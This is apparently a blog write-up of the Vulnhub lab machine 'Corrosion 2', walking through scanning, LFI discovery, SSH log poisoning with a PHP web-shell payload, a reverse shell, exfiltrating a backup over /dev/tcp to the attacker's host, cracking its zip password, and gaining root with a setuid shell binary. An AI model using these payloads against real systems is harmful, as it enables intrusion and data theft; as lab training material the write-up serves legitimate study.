---

title: "Corrosion"
date: 2022-01-18 01:09:33 +0300
author: oste
image: /assets/img/Posts/Corrosion.png
categories: [Vulnhub]
tags: [linux, lfi, rce, log poisoning, ubuntu]
---

| Machine       | [Corrosion](https://www.vulnhub.com/entry/corrosion-2,745/)              |
| ------------- | ------------------------------------------------------------------------ |
| Author        | [Proxy Programmer](https://www.vulnhub.com/author/proxy-programmer,812/) |
| Difficulty    | Medium                                                                   |
| Series        | [Corrosion](https://www.vulnhub.com/series/corrosion,491/)               |
| Date release  | 2021-09-21                                                               |
| Download Link | [here](https://download.vulnhub.com/corrosion/Corrosion2.ova)            |

Hey guys, welcome yet to I hope you enjoy reading through my thought-process for this box.

I first used a tool called `netdiscover` to discover machines in my network. (_In this case, i used host-only adapter on both Kali & Target_)

```bash
➜  netdiscover -i eth1
Currently scanning: 172.23.254.0/16   |   Screen View: Unique Hosts

 11 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 660
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.151  08:00:27:f2:86:43      5     300  PCS Systemtechnik GmbH
 192.168.56.1    0a:00:27:00:00:0b      1      60  Unknown vendor
 192.168.56.100  08:00:27:83:7e:81      5     300  PCS Systemtechnik GmbH

[2]  + 1720 suspended  netdiscover -i eth1

```

After discovering the targets IP address, i then proceeded to perform an nmap scan to determine what ports were open and what services are running behind them.

```bash
➜  nmap -sC -sV -p- -T4 192.168.56.151
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-17 15:03 EST
Nmap scan report for 192.168.56.151
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0c:a7:1c:8b:4e:85:6b:16:8c:fd:b7:cd:5f:60:3e:a4 (RSA)
|   256 0f:24:f4:65:af:50:d3:d3:aa:09:33:c3:17:3d:63:c7 (ECDSA)
|_  256 b0:fa:cd:77:73:da:e4:7d:c8:75:a1:c5:5f:2c:21:0a (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.46 (Ubuntu)
MAC Address: 08:00:27:F2:86:43 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.75 seconds

```

We see that we have ssh & Apache running. Lets start by looking at the webpage.

![image](https://user-images.githubusercontent.com/58165365/149884065-bd6f6dbb-102e-4945-a2c0-50f6acb47f49.png)

Nothing much here...how about some fuzzing?

```bash
┌──(root💀kali)-[/home/kali/Downloads/tools]
└─# gobuster dir -u http://192.168.56.151 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.151
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/01/17 15:09:55 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/tasks                (Status: 301) [Size: 316] [--> http://192.168.56.151/tasks/]
/blog-post            (Status: 301) [Size: 320] [--> http://192.168.56.151/blog-post/]
/server-status        (Status: 403) [Size: 279]

===============================================================
2022/01/17 15:22:21 Finished
===============================================================
```

Eeer...`tasks` & `blog-post` sure sounds interesting..Lets check it out.

![image](https://user-images.githubusercontent.com/58165365/149883992-427aea36-86c6-4b14-b7f3-d1a6aa7ed697.png)

There is nothing on the `blog-post` directory, but we have a potential user - `randy`. Take note of that.

![image](https://user-images.githubusercontent.com/58165365/149884111-0ed33164-4448-4db2-93a4-037ce6b7505e.png)

![image](https://user-images.githubusercontent.com/58165365/149884127-11f171c0-31d5-4fd7-a007-4cd5a57377a2.png)

Looking at the `tasks`, we see that we have a txt file which contains some instructions. Task 1 tells us to change permissions for auth log file. Could this be a hint to some log poisoning attack? I dunno just yet but we'll see.

Lets fuzz `blog-post` further to see if there could be potentially useful information.

```bash
┌──(root💀kali)-[/home/kali/Desktop/VULNHUB_STUFF/corrosion]
└─# gobuster dir -u http://192.168.56.151/blog-post/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.151/blog-post/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/01/17 15:37:42 Starting gobuster in directory enumeration mode
===============================================================
/archives             (Status: 301) [Size: 329] [--> http://192.168.56.151/blog-post/archives/]
/uploads              (Status: 301) [Size: 328] [--> http://192.168.56.151/blog-post/uploads/]
/index.html           (Status: 200) [Size: 190]
Progress: 253684 / 882244 (28.75%)
```

Awesome, so we now have `/archives`& `/uploads` , Lets check them out.

![image](https://user-images.githubusercontent.com/58165365/149883933-97609f10-4e44-4f47-87c5-8252bd532337.png)

![image](https://user-images.githubusercontent.com/58165365/149884102-30d22e9e-ab08-4a00-a8c8-865142b920f9.png)

We now have access to `randylogs.php` which does not output anything. I tried fuzzing for a parameter which i could use to test for LFI and it actually worked.

```bash
┌──(root💀kali)-[/home/kali/Downloads/tools/ffuf]
└─# ./ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u 'http://192.168.56.151/blog-post/archives/randylogs.php?FUZZ=/etc/passwd' -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.151/blog-post/archives/randylogs.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

file                    [Status: 200, Size: 2832, Words: 38, Lines: 49]
:: Progress: [20475/20475] :: Job [1/1] :: 1136 req/sec :: Duration: [0:00:19] :: Errors: 0 ::

```

I then tried to read the contents of `/var/log/auth.log` file and it worked. Awesome..So what next?

> _/var/log/auth. log – Contains system authorization information, including user logins and authentication machinsm that were used._

![image](https://user-images.githubusercontent.com/58165365/149883967-83cefbac-f655-4b23-b7b0-169e6a300ca4.png)

We can try log poisoning attack and see if it actually works.

> _Log Poisoning is a common technique used to gain a reverse shell from a LFI vulnerability._

If we try ssh as root or hackerman, we can see logs for the same

![image](https://user-images.githubusercontent.com/58165365/149884021-7c82ee90-cb7f-413a-9dc0-cc51627b85d8.png)

![image](https://user-images.githubusercontent.com/58165365/149884008-3a299304-0afc-4354-a888-55881d2090ef.png)

Writing invalidated user input to log files can allow an attacker to forge log entries or inject malicious content into the logs. In this case, we can try inject a php payload as the username and see if it will be rendered in the log files.

`ssh '<?php system($_GET["cmd"]); ?>'@192.168.56.151`

![image](https://user-images.githubusercontent.com/58165365/149884045-cdbdacc6-5ebc-4d89-a545-56deb6b550f9.png)

![image](https://user-images.githubusercontent.com/58165365/149884037-2e28d58c-aae5-4179-bfed-4d42b6da4a86.png)

This time round , we see the user is unknown. So the payload actually worked. We can try append the `cmd` parameter and test whether we can run the `id` command.

![image](https://user-images.githubusercontent.com/58165365/149884153-015beb74-eead-46aa-8ad4-08b8f33ad15f.png)

Awesome...Since it works, we can then slap in a bash-onliner and hopefully attain RCE. In my case, i had to url-encode it. (_You can do this on burp on online encoders_). I then started a netcat listener in the background.

![image](https://user-images.githubusercontent.com/58165365/149884140-79a2dfed-7783-4d5e-a20d-670029e71284.png)

```bash
➜  nc -lnvp 9999
listening on [any] 9999 ...
connect to [192.168.56.106] from (UNKNOWN) [192.168.56.151] 53690
bash: cannot set terminal process group (881): Inappropriate ioctl for device
bash: no job control in this shell
www-data@corrosion:/var/www/html/blog-post/archives$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@corrosion:/var/www/html/blog-post/archives$ uname -a
uname -a
Linux corrosion 5.11.0-25-generic #27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
www-data@corrosion:/var/www/html/blog-post/archives$ cat /etc/passwd | grep home
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
cups-pk-helper:x:114:121:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
```

Now we have a reverse shell...With some manual enumeration, we can assertain that user randy indeed exists on the system. I did go a step further to upload linepeas on the target machine and try find out interesting files or privilege escalation paths.

```bash
www-data@corrosion:/var/www/html/blog-post/archives$ cd /tmp/
www-data@corrosion:/tmp$ wget http://192.168.56.106/linepeas.sh
--2022-01-17 17:42:54--  http://192.168.56.106/linepeas.sh
Connecting to 192.168.56.106:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325335 (318K) [text/x-sh]
Saving to: ‘linepeas.sh’

linepeas.sh                  100%[==============================================>] 317.71K  --.-KB/s    in 0.008s

2022-01-17 17:42:54 (39.7 MB/s) - ‘linepeas.sh’ saved [325335/325335]

www-data@corrosion:/tmp$ chmod +x linepeas.sh
www-data@corrosion:/tmp$
```

I did not seems to find anything interesting, though i did find the user's home directory backup in `/var/backups`

![image](https://user-images.githubusercontent.com/58165365/149884102-30d22e9e-ab08-4a00-a8c8-865142b920f9.png)

We can transfer this file to our system as shown below:

```bash
www-data@corrosion:/tmp$ cd /var/backups/
www-data@corrosion:/var/backups$ ls -la
total 2668
drwxr-xr-x  2 root root    4096 Jan 17 16:02 .
drwxr-xr-x 15 root root    4096 Jul 29 17:13 ..
-rw-r--r--  1 root root   61440 Jan 17 16:02 alternatives.tar.0
-rw-r--r--  1 root root    2867 Jul 29 17:15 alternatives.tar.1.gz
-rw-r--r--  1 root root  102709 Jul 29 23:51 apt.extended_states.0
-rw-r--r--  1 root root      11 Jul 29 17:05 dpkg.arch.0
-rw-r--r--  1 root root      43 Jul 29 17:05 dpkg.arch.1.gz
-rw-r--r--  1 root root      43 Jul 29 17:05 dpkg.arch.2.gz
-rw-r--r--  1 root root     616 Jul 29 17:06 dpkg.diversions.0
-rw-r--r--  1 root root     220 Jul 29 17:06 dpkg.diversions.1.gz
-rw-r--r--  1 root root     220 Jul 29 17:06 dpkg.diversions.2.gz
-rw-r--r--  1 root root     272 Jul 29 19:23 dpkg.statoverride.0
-rw-r--r--  1 root root     194 Jul 29 19:23 dpkg.statoverride.1.gz
-rw-r--r--  1 root root     168 Apr 20  2021 dpkg.statoverride.2.gz
-rw-r--r--  1 root root 1721335 Jul 30 14:30 dpkg.status.0
-rw-r--r--  1 root root  395230 Jul 29 23:51 dpkg.status.1.gz
-rw-r--r--  1 root root  386883 Jul 29 17:13 dpkg.status.2.gz
-rw-r--r--  1 root root    3285 Jul 30 00:24 user_backup.zip
www-data@corrosion:/var/backups$ cat user_backup.zip > /dev/tcp/192.168.56.106/8888
www-data@corrosion:/var/backups$
```

_Run this on your local machine_

```bash
➜  nc -lnvp 8888 > user_backup.zip
listening on [any] 8888 ...
connect to [192.168.56.106] from (UNKNOWN) [192.168.56.151] 36606
```

Awesome... trying to unzip the file requires a password. Using `zip2john`, we can dump the zip file's hash which we can try crack using `john`.

```bash
➜  ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 17 17:04 .
drwxr-xr-x 4 root root 4096 Jan 17 15:01 ..
-rw-r--r-- 1 root root 3285 Jan 17 17:04 user_backup.zip
➜  unzip user_backup.zip
Archive:  user_backup.zip
[user_backup.zip] id_rsa password:
   skipping: id_rsa                  incorrect password
   skipping: id_rsa.pub              incorrect password
   skipping: my_password.txt         incorrect password
   skipping: easysysinfo.c           incorrect password
➜  locate zip2john
/usr/sbin/zip2john
➜  /usr/sbin/zip2john user_backup.zip > forjohn
ver 2.0 efh 5455 efh 7875 user_backup.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1979, decmplen=2590, crc=A144E09A
ver 2.0 efh 5455 efh 7875 user_backup.zip/id_rsa.pub PKZIP Encr: 2b chk, TS_chk, cmplen=470, decmplen=563, crc=41C30277
ver 1.0 efh 5455 efh 7875 user_backup.zip/my_password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=35, decmplen=23, crc=21E9B663
ver 2.0 efh 5455 efh 7875 user_backup.zip/easysysinfo.c PKZIP Encr: 2b chk, TS_chk, cmplen=115, decmplen=148, crc=A256BBD9
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
➜  john --wordlist=/usr/share/wordlists/rockyou.txt forjohn
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!randybaby       (user_backup.zip)
1g 0:00:00:07 DONE (2022-01-17 17:05) 0.1261g/s 1807Kp/s 1807Kc/s 1807KC/s #1Emokid..!jonas
Use the "--show" option to display all of the cracked passwords reliably
Session completed
➜  unzip user_backup.zip
Archive:  user_backup.zip
[user_backup.zip] id_rsa password:
  inflating: id_rsa
  inflating: id_rsa.pub
 extracting: my_password.txt
  inflating: easysysinfo.c
```

In this case, i got the password as `!randybaby` and unzipped the contents. Cating the contents of `my_password.txt`, we get the password which we can use to authenticate with for further enumeration.

```bash
➜  ls -la
total 32
drwxr-xr-x 2 root root 4096 Jan 17 17:05 .
drwxr-xr-x 4 root root 4096 Jan 17 15:01 ..
-rw-r--r-- 1 root root  148 Jul 30 02:11 easysysinfo.c
-rw-r--r-- 1 root root  403 Jan 17 17:05 forjohn
-rw------- 1 root root 2590 Jul 30 02:20 id_rsa
-rw-r--r-- 1 root root  563 Jul 30 02:20 id_rsa.pub
-rw-r--r-- 1 root root   23 Jul 30 02:21 my_password.txt
-rw-r--r-- 1 root root 3285 Jan 17 17:04 user_backup.zip
➜  cat my_password.txt
randylovesgoldfish1998
```

We're in.😎

```bash
➜  ssh randy@192.168.56.151 -i id_rsa
randy@192.168.56.151's password:
Welcome to Ubuntu 21.04 (GNU/Linux 5.11.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

119 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Jul 30 15:28:02 2021 from 10.0.0.69
randy@corrosion:~$ id
uid=1000(randy) gid=1000(randy) groups=1000(randy),4(adm),24(cdrom),30(dip),46(plugdev),121(lpadmin),133(sambashare)
randy@corrosion:~$ ls -la
total 88
drwxr-x--- 17 randy randy 4096 Jul 30 16:01 .
drwxr-xr-x  3 root  root  4096 Jul 29 17:05 ..
-rw-rw-r--  1 randy randy   68 Jul 30 16:01 .bash_history
-rw-r--r--  1 randy randy  220 Jul 29 17:05 .bash_logout
-rw-r--r--  1 randy randy 3771 Jul 29 17:05 .bashrc
drwxrwxr-x 12 randy randy 4096 Jul 30 15:19 .cache
drwx------ 11 randy randy 4096 Jul 29 19:18 .config
drwxr-xr-x  2 randy randy 4096 Jul 29 17:40 Desktop
drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Documents
drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Downloads
drwx------  2 randy randy 4096 Jul 30 15:41 .gnupg
drwxr-xr-x  3 randy randy 4096 Jul 29 17:11 .local
drwx------  5 randy randy 4096 Jul 29 19:15 .mozilla
drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Music
drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Pictures
-rw-r--r--  1 randy randy  807 Jul 29 17:05 .profile
drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Public
-rw-rw-r--  1 randy randy    0 Jul 30 14:48 .selected_editor
drwx------  2 randy randy 4096 Jul 29 17:24 .ssh
-rw-r--r--  1 randy randy    0 Jul 29 17:12 .sudo_as_admin_successful
drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Templates
drwxrwxr-x  2 randy randy 4096 Jul 30 00:11 tools
-rw-r--r--  1 root  root    21 Jul 30 15:30 user.txt
drwxr-xr-x  2 randy randy 4096 Jul 29 17:11 Videos
randy@corrosion:~$ cat user.txt
98342721012390839081
```

Looking at the sudoers file, we see that randy can run `/home/randy/tools/easysysinfo` binary without a password. Lets check out that directory.

```bash
randy@corrosion:~$ sudo -l
[sudo] password for randy:
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
	randy@corrosion:~$ cd tools/
randy@corrosion:~/tools$ ls -la
total 28
drwxrwxr-x  2 randy randy  4096 Jul 30 00:11 .
drwxr-x--- 17 randy randy  4096 Jul 30 16:01 ..
-rwsr-xr-x  1 root  root  16192 Jul 30 00:11 easysysinfo
-rwxr-xr-x  1 root  root    318 Jul 29 19:12 easysysinfo.py
randy@corrosion:~/tools$ cat easysysinfo.py
#!/usr/bin/python3.9

import os

command1 = "/usr/bin/date"
command2 = "/usr/bin/cat /etc/hosts"
command3 = "/usr/bin/uname -a"


def output():
        print("Today is: ")
        os.system(command1)

        print("\n")

        print("Hosts File: ")
        os.system(command2)

        print("\n")

        print("Kernal Version: ")
        os.system(command3)

output()
```

What we can try do is create our own binary using a simple code in `c`.

_For reference, you can check out this blog by [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)_

```bash
randy@corrosion:~/tools$ nano easysysinfo.c
randy@corrosion:~/tools$ cat easysysinfo.c
#include <unistd.h>
#include <stdlib.h>

void main()
{
  setuid(0);
  setgid(0);
  system("bash -i");
}
randy@corrosion:~/tools$ gcc easysysinfo.c -o easysysinfo
randy@corrosion:~/tools$ chmod u+s easysysinfo
```

If we now run the binary, we are root. You can easily get the root flag in the `/root` directory and a bonus `root_creds.txt` in `/creds`.

```bash
randy@corrosion:~/tools$ sudo /home/randy/tools/easysysinfo
root@corrosion:/home/randy/tools# id
uid=0(root) gid=0(root) groups=0(root)
root@corrosion:/home/randy/tools# cd /root/
root@corrosion:~# ls -la
total 52
drwx------  7 root root 4096 Jul 30 15:59 .
drwxr-xr-x 20 root root 4096 Jul 29 17:05 ..
-rw-r--r--  1 root root  461 Jul 30 16:01 .bash_history
-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc
drwx------  2 root root 4096 Apr 20  2021 .cache
drwx------  3 root root 4096 Jul 30 14:24 .config
drwxr-xr-x  2 root root 4096 Jul 30 00:33 creds
drwxr-xr-x  3 root root 4096 Jul 29 17:16 .local
-rw-r--r--  1 root root   10 Jan 17 18:23 logs.txt
-rw-r--r--  1 root root  161 Sep 16  2020 .profile
-rw-r--r--  1 root root  251 Jul 30 15:31 root.txt
-rw-r--r--  1 root root   66 Jul 30 14:30 .selected_editor
drwxr-xr-x  3 root root 4096 Jul 29 17:10 snap
-rw-r--r--  1 root root    0 Jul 30 15:23 .sudo_as_admin_successful
root@corrosion:~# wc root.txt
  7  24 251 root.txt
root@corrosion:~# cat root.txt
FLAG: 4NJSA99SD7922197D7S90PLAWE

Congrats! Hope you enjoyed my first machine posted on VulnHub!
Ping me on twitter @proxyprgrammer for any suggestions.

Youtube: https://www.youtube.com/c/ProxyProgrammer
Twitter: https://twitter.com/proxyprgrammer
root@corrosion:~# cd creds/
root@corrosion:~/creds# ls -la
total 12
drwxr-xr-x 2 root root 4096 Jul 30 00:33 .
drwx------ 7 root root 4096 Jul 30 15:59 ..
-rw------- 1 root root   33 Jul 30 00:28 root_creds.txt
root@corrosion:~/creds# cat root_creds.txt
рандиистхебест1993

```

Translating this on google gives us: `randiisthebest1993`

![image](https://user-images.githubusercontent.com/58165365/149907073-360926c4-bcd6-4ecd-ab1a-fb5805455a85.png)

## Resources

- [Log Injection](https://owasp.org/www-community/attacks/Log_Injection)
- [RCE via LFI Log Poisoning - The Death Potion](https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d)
- [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
